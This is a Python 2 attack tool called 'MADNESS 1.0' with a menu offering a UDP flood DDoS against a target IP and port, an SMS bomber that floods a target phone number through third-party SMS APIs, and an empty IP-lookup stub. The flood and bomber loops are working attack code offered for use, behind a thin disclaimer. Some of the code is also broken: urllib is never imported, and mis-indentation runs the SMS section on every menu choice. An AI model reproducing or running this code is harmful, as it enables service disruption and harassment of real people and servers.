# -*- coding: utf-8 -*-
import requests
import os
import json
import colorama
from colorama import init, Fore
import time
init(autoreset=True)
import sys  
import socket
import threading
import logging
import random
import urllib2, cookielib
import random
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year

logo = """
 (        )     (   (     
 (  `    (    )\ )  ( /(     )\ ))\ )  
 )\))(   )\  (()/(  )\())(  (()/(()/(  
((_)()((((_)( /(_))((_)\ )\  /(_))(_)) 
(_()((_)\ _ )(_))_  _((_|(_)(_))(_))    
|  \/  (_)_\(_)   \| \| | __/ __/ __|   
| |\/| |/ _ \  | |) | .` | _|\__ \__ \   
|_|  |_/_/ \_\|___/|_|\_|___|___/___/    
"""                                      

credits = """
MADNESS 1.0
Made by TWC [The Wrecking Crew] with Evos Madness.
"""

legal = """
Notice: It is your responsibility to suffer any leg-al consequences that may follow, by any causes of using this tool.
"""
FlameGRAVE = """
▄████  █    ██   █▀▄▀█ ▄███▄     
█▀   ▀ █    █ █  █ █ █ █▀   ▀    
█▀▀    █    █▄▄█ █ ▄ █ ██▄▄      
█      ███▄ █  █ █   █ █▄   ▄▀   
 █         ▀   █    █  ▀███▀     
  ▀           █    ▀             
             ▀                   
  ▄▀  █▄▄▄▄ ██       ▄   ▄███▄   
▄▀    █  ▄▀ █ █       █  █▀   ▀  
█ ▀▄  █▀▀▌  █▄▄█ █     █ ██▄▄    
█   █ █  █  █  █  █    █ █▄   ▄▀ 
 ███    █      █   █  █  ▀███▀   
       ▀      █     █▐           
             ▀      ▐            
"""
MadSpam = """
 ▄▀▀▄ ▄▀▄  ▄▀▀█▄   ▄▀▀█▄▄           
█  █ ▀  █ ▐ ▄▀ ▀▄ █ ▄▀   █          
▐  █    █   █▄▄▄█ ▐ █    █          
  █    █   ▄▀   █   █    █          
▄▀   ▄▀   █   ▄▀   ▄▀▄▄▄▄▀          
█    █    ▐   ▐   █     ▐           
▐    ▐            ▐                 
 ▄▀▀▀▀▄  ▄▀▀▄▀▀▀▄  ▄▀▀█▄   ▄▀▀▄ ▄▀▄ 
█ █   ▐ █   █   █ ▐ ▄▀ ▀▄ █  █ ▀  █ 
   ▀▄   ▐  █▀▀▀▀    █▄▄▄█ ▐  █    █ 
▀▄   █     █       ▄▀   █   █    █  
 █▀▀▀    ▄▀       █   ▄▀  ▄▀   ▄▀   
 ▐      █         ▐   ▐   █    █    
        ▐                 ▐    ▐    
"""
barrier = """
___________________________________________________
"""
while True:
    os.system("printf '\033]0;logo\007'")
    os.system("clear")
    print(Fore.RED + logo)
    print(Fore.RED + credits)
    print(Fore.BLUE + legal)
    print(Fore.RED + barrier)
    print(Fore.MAGENTA + "[1] FlameGRAVE DDos Tool")
    print(Fore.CYAN + "[2] MadSpam SMS Bomber")
    print(Fore.GREEN + "[3] IP Address Lookup Tools")
    print("[0] Exit")
    x = raw_input("Option: ").strip()

    if x == "1":
        os.system("clear")
        print(Fore.MAGENTA + FlameGRAVE)
        server_ip = raw_input(Fore.RED + "Enter Target IP: ").strip()
        port = int(raw_input(Fore.RED + "Enter Target IP Port [1-65535]: ").strip())


        os.system("clear")
        print
        print(Fore.MAGENTA + FlameGRAVE)
        print(Fore.CYAN + barrier)
        print("\033[92m")
        print("________________ATTEMPTING TO FIND SERVER_____________________")
        time.sleep(3)
        print("_________________CONNECTING TO TARGET_______________________")
        time.sleep(3)
        print("__________________CHARGING FIREBALLS________________________")
        time.sleep(3)
        print(Fore.RED + "_________________TARGET IS GETTING SWARMED!________________________")
        time.sleep(3)
        print
        print(Fore.MAGENTA + "SHOOTING FIREBALLS!. We hope you are using this for ethical purposes. Type Ctrl+C to suspend the attack.")
        time.sleep(2)
        sent = 0
        try:
            while True:
                sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                bytes = random._urandom(1490)
                sock.sendto(bytes, (server_ip, port))
                sent = sent + 1
                port = port + 1
                print(Fore.RED + "Fireball %s shot to %s through port:%s" % (sent, server_ip, port))
                if port == 65534:
                    port = 1
        except KeyboardInterrupt:
            raw_input("\nAttack suspended. Press Enter to return to the menu...")

    if x == "2":
          os.system("clear")

    def send(num, counter, sleep):
        with open("apis.json", "r") as f:
            data = json.load(f)
         
        api_list = []
        for lst in data["sms"].values():
            api_list.extend(lst)
         
        if not api_list:
            print("No APIs found in apis.json")
            return

        for i in range(counter):
              for api in api_list:
                     try:
                            api_url = api.get("url", "")
                            method = api.get("method", "").upper()
                            data = api.get("data", {})
                            headers = api.get("headers", {})
                          
                            def replace(obj):
                                if isinstance(obj, dict):
                                    return {k: replace(v) for k, v in obj.items()}
                                if isinstance(obj, str):
                                    return obj.replace("{target}", num)
                                else:
                                    return obj
                            
                            data = replace(data)
                            headers = replace(headers)

                            if method == "GET":
                                if data:
                                    api_url += "?" + urllib.urlencode(data)
                                req = urllib2.Request(api_url, headers=headers)
                                urllib2.urlopen(req)
                            if method == "POST":
                               post_data = urllib.urlencode(data) if data else None
                               req = urllib2.Request(api_url, data=post_data, headers=headers)
                               urllib2.urlopen(req)

                            print("Message sent! (Attempt {})".format(i+1))
                            break  # One success = stop trying APIs for this attempt
                     except Exception:
                         continue  # Try next API if failed
                     time.sleep(sleep)

    try:
        print(Fore.CYAN + MadSpam)
        print(Fore.RED + barrier)
        number = raw_input("Enter Target Number: ")
        count = raw_input("Enter number of SMS Messages: ")
        throttle = raw_input("Enter time interval: ")
        send(number, int(count), int(throttle))
        raw_input("Press Enter to return to menu...")
    finally:
        pass

    if x == "3":
       os.system("clear")
       print("IP Lookup\n")
       # ... your IP Lookup code here
       raw_input("Press Enter to return to menu...")

    if x == "0":
        print("Exiting...")
        break

    else:
        print("Invalid option.")
        raw_input("Press Enter to return to menu...")
